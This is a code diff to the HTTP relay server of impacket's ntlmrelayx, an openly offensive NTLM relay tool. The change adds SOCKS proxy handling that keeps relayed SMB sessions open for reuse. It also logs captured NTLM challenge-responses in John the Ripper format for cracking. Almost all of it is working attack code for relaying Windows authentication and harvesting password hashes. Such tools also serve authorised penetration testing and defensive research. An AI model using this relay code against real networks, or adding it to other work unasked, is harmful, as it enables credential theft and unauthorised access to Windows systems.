@@ -29,6 +29,7 @@ from impacket.spnego import SPNEGO_NegTokenResp
 from impacket.smbserver import outputToJohnFormat, writeJohnOutputToFile
 from impacket.nt_errors import STATUS_ACCESS_DENIED, STATUS_SUCCESS
 from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
+from impacket.examples.ntlmrelayx.servers.socksserver import activeConnections
 
 class HTTPRelayServer(Thread):
     class HTTPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
@@ -132,7 +133,8 @@ class HTTPRelayServer(Thread):
                 authenticateMessage = ntlm.NTLMAuthChallengeResponse()
                 authenticateMessage.fromString(token)
                 if not self.do_ntlm_auth(token,authenticateMessage):
-                    logging.error("Authenticating against %s as %s\%s FAILED" % (self.target[1],authenticateMessage['domain_name'], authenticateMessage['user_name']))
+                    logging.error("Authenticating against %s as %s\%s FAILED" % (
+                    self.target[1], authenticateMessage['domain_name'], authenticateMessage['user_name']))
 
                     #Only skip to next if the login actually failed, not if it was just anonymous login or a system account which we don't want
                     if authenticateMessage['user_name'] != '': # and authenticateMessage['user_name'][-1] != '$':
@@ -144,13 +146,18 @@ class HTTPRelayServer(Thread):
                         self.do_AUTHHEAD('NTLM')
                 else:
                     # Relay worked, do whatever we want here...
-                    logging.info("Authenticating against %s as %s\%s SUCCEED" % (self.target[1],authenticateMessage['domain_name'], authenticateMessage['user_name']))
-                    ntlm_hash_data = outputToJohnFormat( self.challengeMessage['challenge'], authenticateMessage['user_name'], authenticateMessage['domain_name'], authenticateMessage['lanman'], authenticateMessage['ntlm'] )
+                    logging.info("Authenticating against %s as %s\%s SUCCEED" % (
+                    self.target[1], authenticateMessage['domain_name'], authenticateMessage['user_name']))
+                    ntlm_hash_data = outputToJohnFormat(self.challengeMessage['challenge'],
+                                                        authenticateMessage['user_name'],
+                                                        authenticateMessage['domain_name'],
+                                                        authenticateMessage['lanman'], authenticateMessage['ntlm'])
                     logging.info(ntlm_hash_data['hash_string'])
                     if self.server.config.outputFile is not None:
                         writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'], self.server.config.outputFile)
                     self.server.config.target.log_target(self.client_address[0],self.target)
-                    self.do_attack()
+
+                    self.do_attack( {'CHALLENGE_MESSAGE': self.challengeMessage} )
                     # And answer 404 not found
                     self.send_response(404)
                     self.send_header('WWW-Authenticate', 'NTLM')
@@ -296,10 +303,16 @@ class HTTPRelayServer(Thread):
             else:
                 return False
 
-        def do_attack(self):
+        def do_attack(self, connData=False):
             if self.target[0] == 'SMB':
-                clientThread = self.server.config.attacks['SMB'](self.server.config, self.client, self.authUser)
-                clientThread.start()
+                if self.server.config.runSocks is True:
+                    # For now, we only support SOCKS for SMB, for now.
+                    # Pass all the data to the socksplugins proxy
+                    activeConnections.put((self.target[1], 445, self.authUser, self.client, connData))
+                    logging.info("Adding %s(445) to active SOCKS connection. Enjoy" % self.target[1])
+                else:
+                    clientThread = self.server.config.attacks['SMB'](self.server.config, self.client, self.authUser)
+                    clientThread.start()
             if self.target[0] == 'LDAP' or self.target[0] == 'LDAPS':
                 clientThread = self.server.config.attacks['LDAP'](self.server.config, self.client, self.authUser)
                 clientThread.start()
